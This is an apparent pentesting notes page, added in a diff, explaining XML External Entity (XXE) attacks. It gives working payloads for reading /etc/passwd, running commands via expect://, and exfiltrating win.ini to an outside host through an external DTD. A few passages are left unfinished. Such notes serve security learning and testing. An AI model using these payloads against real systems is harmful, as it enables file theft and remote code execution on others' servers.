@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>XML External Entity (XXE) - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "XML External Entity Attack", url: "#_top", children: [
+              {title: "Background XML", url: "#background-xml" },
+              {title: "Syntax rule", url: "#syntax-rule" },
+              {title: "Attack", url: "#attack" },
+              {title: "Test for it", url: "#test-for-it" },
+              {title: "XXE with JSON", url: "#xxe-with-json" },
+              {title: "XXE in Excel Xlsx files", url: "#xxe-in-excel-xlsx-files" },
+              {title: "Payloads", url: "#payloads" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../subdomain_takeover/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../subdomain_takeover/" class="btn btn-xs btn-link">
+        Subdomain Takerovers
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../sql-injections/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../sql-injections/" class="btn btn-xs btn-link">
+        SQL Injections
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="xml-external-entity-attack">XML External Entity Attack<a class="headerlink" href="#xml-external-entity-attack" title="Permanent link">#</a></h1>
+<p>With this attack you can do:</p>
+<ul>
+<li>Read local files</li>
+<li>Denial-of-service</li>
+<li>Perform port-scan</li>
+<li>Remote Code Execution (on ASPX and PHP sometimes)</li>
+</ul>
+<p>Where do you find it:</p>
+<ul>
+<li>
+<p>Anywhere where XML is posted.</p>
+</li>
+<li>
+<p>Common with file-uploading functionality. For files that uses XML, like: docx, pptx, gpx, pdf and xml itself.</p>
+</li>
+</ul>
+<h3 id="background-xml">Background XML<a class="headerlink" href="#background-xml" title="Permanent link">#</a></h3>
+<p>XML is a markup language, like HTML. Unlike HTML is does not have any predefined tags. It is the user that create the tags in the XML object. XML is just a format for storing and transporing data. XML uses tags and subtags, just like html. Or parents, children, and syblings. So in that sense it has the same tree-structure as html.</p>
+<p>To define a XML-section/document you need the following tag to begin:
+Oh, and by the way TAG is named ELEMENT (same as in html)</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+</code></pre>
+
+<p>Example of valid XML:</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+    &lt;change-log&gt;
+        &lt;text&gt;Hello World&lt;/text&gt;
+    &lt;/change-log&gt;
+</code></pre>
+
+<p>DTD stand for Document type definition. A DTD is basically a file that defines the structure of an XML document.</p>
+<p>For example, this is quite common to see baick in the days:
+This simply means that the XML document will follow the standard defined in the references DTD. This DTD simply defines an old form of HTML.</p>
+<pre><code>&lt;!DOCTYPE html PUBLIC
+  &quot;-//W3C//DTD XHTML Basic 1.0//EN&quot;
+    &quot;http://www.w3.org/TR/xhtml-basic/xhtml-basic10.dtd&quot;&gt;
+</code></pre>
+
+<p>DTD:s can be really useful in order to create a standard when transferring data. The sender and the reciever knows exactly what tags the document will have. So imagine that you create a service that anyone can use to send in data in the format of XML, but how will they know what elements are required, and so on.</p>
+<p><a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</a></p>
+<h3 id="syntax-rule">Syntax rule<a class="headerlink" href="#syntax-rule" title="Permanent link">#</a></h3>
+<p>So, now that we know that DTD are just definitions of XML documents, the question becomes, how do we write our own DTD:s.</p>
+<p>A DTD must adhere to a few rules.</p>
+<ul>
+<li>Must have root element (it doesn't have to be called root, it can be called anything)</li>
+<li>Optional have XML prolog (xml version is the prolog)</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+</code></pre>
+
+<ul>
+<li>All elements must have closing tag</li>
+<li>Tags are case-sensitive</li>
+<li>XML Attributes must be quotes</li>
+<li>Special characters must be escaped correctly.</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="left">&lt;</th>
+<th align="left">&lt;</th>
+<th align="left">less than</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">&gt;</td>
+<td align="left">&gt;</td>
+<td align="left">greater than</td>
+</tr>
+<tr>
+<td align="left">&amp;</td>
+<td align="left">&amp;</td>
+<td align="left">ampersand</td>
+</tr>
+<tr>
+<td align="left">'</td>
+<td align="left">'</td>
+<td align="left">apostrophe</td>
+</tr>
+<tr>
+<td align="left">"</td>
+<td align="left">"</td>
+<td align="left">quotation mark</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li>Whitespace is perserved in XML</li>
+</ul>
+<p>Okay, so those are some of the rules. Now let's look at some practical examples, how do we create/define an element in in a DTD?</p>
+<pre><code> &lt;!ELEMENT element-name category&gt;
+ or
+ &lt;!ELEMENT element-name (element-content)&gt; 
+</code></pre>
+
+<p>In attacks you will probably see things like this:</p>
+<pre><code>&lt;!ENTITY name value&gt;
+&lt;!ENTITY % name value&gt;
+</code></pre>
+
+<p>The first one create a general entity. The second one (with the percentage sign) creates a "parameter" entity.
+I think the first one is dereferences like this</p>
+<pre><code>&amp;name;
+</code></pre>
+
+<p>ANd the second one like this:</p>
+<pre><code>%name;
+</code></pre>
+
+<p>So, now lets combine all this and create a DTD. If the DTD is defined inside an already existing XML document we need the following. THis says: "here comes a DTD".</p>
+<pre><code> &lt;!DOCTYPE note []&gt;
+</code></pre>
+
+<p>Now let's add some elements:</p>
+<pre><code>&lt;!DOCTYPE note [
+ &lt;!ELEMENT note (name, age)&gt;     //This means that the note element must contain a name and age element. The parenthesis just means that it coantains child elements.
+&lt;!ELEMENT name (#PCDATA)&gt;       // Here we define the name of the element &lt;name&gt;&lt;/name&gt; and that it will be PCDATA
+&lt;!ELEMENT age (#PCDATA)&gt;
+]&gt;
+
+&lt;note&gt;
+&lt;name&gt;Pelle&lt;/name&gt;
+&lt;age&gt;20&lt;/age&gt;
+&lt;/note&gt;
+</code></pre>
+
+<p>Okay. But maybe we don't want to define the entire XML document, inside every request, inside every XML document. It seems a bit like a hassle. So maybe we can just import the DTD? YES, this is possible.</p>
+<p>The most basic way this can be done is the following way. SYSTEM is just a keyword for "load external DTD".</p>
+<pre><code>&lt;!DOCTYPE root SYSTEM &quot;myDTD.dtd&quot;&gt;
+&lt;!DOCTYPE root SYSTEM &quot;http://yourdomain.net/myDTD.dtd&quot;&gt;
+</code></pre>
+
+<p>Which protocols are allowed depends on the implementation of the XML parser. But some that might work are the following:</p>
+<pre><code>gopher://
+file://
+http://
+https://
+file://
+ftp://
+</code></pre>
+
+<p>Okay. So now we know how we can retreieve an external DTD.
+But what about ENTITY, it is even int eh name of the attack XML EXTERNAL ENTITY.</p>
+<p>So, when you define your DTD you can basically create variables, in xml-speak a variable is an ENTITY.</p>
+<p>In a DTD an entitiy is defined like this:</p>
+<pre><code>&lt;!DOCTYPE root [
+&lt;!ENTITY name &quot;PELLE&quot;&gt;
+]&gt;
+&lt;root&gt;&amp;name;&lt;/root&gt;
+</code></pre>
+
+<p>When the XML is parsed the entity will be transformed into "PELLE". Of course, you can also retreive external entities.</p>
+<pre><code>&lt;!DOCTYPE root [
+&lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;root&gt;&amp;name;&lt;/root&gt;
+</code></pre>
+
+<pre><code>&lt;!DOCTYPE root [
+&lt;
+
+]&gt;
+</code></pre>
+
+<h3 id="attack">Attack<a class="headerlink" href="#attack" title="Permanent link">#</a></h3>
+<p>So if an application receives XML to the server the attacker might be able to exploit an XXE. It could be sent as a GET, but it is more likely that it is send in a POST. An attack might look like this:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+ &lt;!DOCTYPE foo [  
+  &lt;!ELEMENT foo ANY &gt;
+  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre>
+
+<p>The elemet can be whatever, it doesn't matter. The xxe is the "variable" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd. SYSTEM means that what is to be included can be found locally on the filesystem.</p>
+<p>In php-applications where the expect module is loaded it is possible to get RCE. It is not a very common vulnerability, but still good to know.</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
+&lt;creds&gt;
+    &lt;user&gt;&amp;xxe;&lt;/user&gt;
+    &lt;pass&gt;mypass&lt;/pass&gt;
+&lt;/creds&gt;
+</code></pre>
+
+<p>Even if the data is not reflected backto the website it is still possible to exfiltrate files and data from the server. The technique is similar to how you exfiltrate the cookie in a Cross-Site Scripting attack, you send it in the url.</p>
+<h3 id="test-for-it">Test for it<a class="headerlink" href="#test-for-it" title="Permanent link">#</a></h3>
+<ul>
+<li>Input is reflected</li>
+</ul>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Any [&lt;!ENTITY xxe &quot;testdata&quot;&gt;]&gt;&lt;add&gt;&amp;xxe;&lt;/add&gt;
+</code></pre>
+
+<p>If "testdata" gets reflected then it is vulnerable to XXE. If it gets reflected you can try to exfiltrate the data the following way:</p>
+<pre><code>&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
+</code></pre>
+
+<p>Another way to test it is to see if the server tries to download the external script. Firs t you need to set up your own webserver, and then wait for it to connect.</p>
+<pre><code>&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.101/fil.txt&quot;&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;
+</code></pre>
+
+<h3 id="xxe-with-json">XXE with JSON<a class="headerlink" href="#xxe-with-json" title="Permanent link">#</a></h3>
+<p>Even if you are sending in JSON, always make sure to convert the JSON to valid XML. And then change the content-type to xml.</p>
+<p>For more see:</p>
+<p>https://blog.netspi.com/playing-content-type-xxe-json-endpoints/</p>
+<h2 id="xxe-in-excel-xlsx-files">XXE in Excel Xlsx files<a class="headerlink" href="#xxe-in-excel-xlsx-files" title="Permanent link">#</a></h2>
+<p>Excel files are just zipped xml files. So you can simply unzip </p>
+<h2 id="payloads">Payloads<a class="headerlink" href="#payloads" title="Permanent link">#</a></h2>
+<h3 id="oob-simple">OOB Simple<a class="headerlink" href="#oob-simple" title="Permanent link">#</a></h3>
+<pre><code>&lt;!DOCTYPE root SYSTEM &quot;http://yourdomain.net/myDTD.dtd&quot;&gt;
+</code></pre>
+
+<h3 id="oob-biztalk">OOB BizTalk<a class="headerlink" href="#oob-biztalk" title="Permanent link">#</a></h3>
+<p>This payload will make a request to hackburk.haxxon.se/quel/dtd.xml:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;!DOCTYPE r [
+&lt;!ELEMENT r ANY &gt;
+&lt;!ENTITY % sp SYSTEM &quot;http://hackburk.haxxson.se/quel/dtd.xml&quot;&gt;
+%sp;
+%param1;
+%exfil;
+]&gt;
+</code></pre>
+
+<p>dtd.xml contains the following:</p>
+<pre><code>&lt;!ENTITY % data SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;
+&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://hackburk.haxxson.se/?%data;'&gt;&quot;&gt;
+
+</code></pre>
+
+<p>The vulnerable server will thus retreive the dtd.xml, then parse it, and then make a request to haxxon.se and include the file in the data parameter. It will be encoded aswell so it will make a correct request.</p>
+<h3 id="examples">Examples<a class="headerlink" href="#examples" title="Permanent link">#</a></h3>
+<ul>
+<li>XXE from uploading Powerpoint - https://hackerone.com/reports/334488</li>
+<li>XXE in SOAP request - https://hackerone.com/reports/36450</li>
+<li>XXE in SVG file upload - https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/</li>
+<li>XXE in PNG/PDF upload</li>
+</ul>
+<h3 id="exfiltrate-data-through-url">Exfiltrate data through URL<a class="headerlink" href="#exfiltrate-data-through-url" title="Permanent link">#</a></h3>
+<p>https://blog.bugcrowd.com/advice-from-a-researcher-xxe/</p>
+<h3 id="references">References<a class="headerlink" href="#references" title="Permanent link">#</a></h3>
+<p><a href="https://securitytraning.com/xml-external-entity-xxe-xml-injection-web-for-pentester/">https://securitytraning.com/xml-external-entity-xxe-xml-injection-web-for-pentester/</a></p>
+<p><a href="https://blog.bugcrowd.com/advice-from-a-researcher-xxe/">https://blog.bugcrowd.com/advice-from-a-researcher-xxe/</a></p>
+<p>http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../subdomain_takeover/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../subdomain_takeover/" class="btn btn-xs btn-link">
+        Subdomain Takerovers
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../sql-injections/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../sql-injections/" class="btn btn-xs btn-link">
+        SQL Injections
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_web_applications/xml_external_entity_attack.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
